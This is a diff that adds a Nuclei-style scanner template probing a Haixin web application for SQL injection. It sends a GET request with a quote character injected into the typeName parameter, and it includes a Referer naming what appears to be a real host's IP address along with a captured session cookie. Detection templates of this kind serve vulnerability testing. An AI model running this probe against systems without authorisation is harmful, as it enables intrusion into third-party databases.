@@ -1,0 +1,27 @@
+id: Haixin-SQL
+
+info:
+  name: Haixin
+  author: dddd
+  severity: high
+
+
+http:
+  - raw:
+      - |+
+        GET /HisModules/Common/Handler/GetTypeentryHandler.ashx?ContainAll=0&order=sequence%20asc&action=GetCustom&typeName=DVRVENDORLIST'&_dc=1708352000650 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+        Accept: text/plain, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/json; charset=utf-8
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+        Referer: http://218.91.52.122:8888/YZSoft/login/?ReturnUrl=%2f
+        Cookie: ASP.NET_SessionId=ostrhyybsn5ihuuppz4x0sfr
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"DVRVENDORLIST")
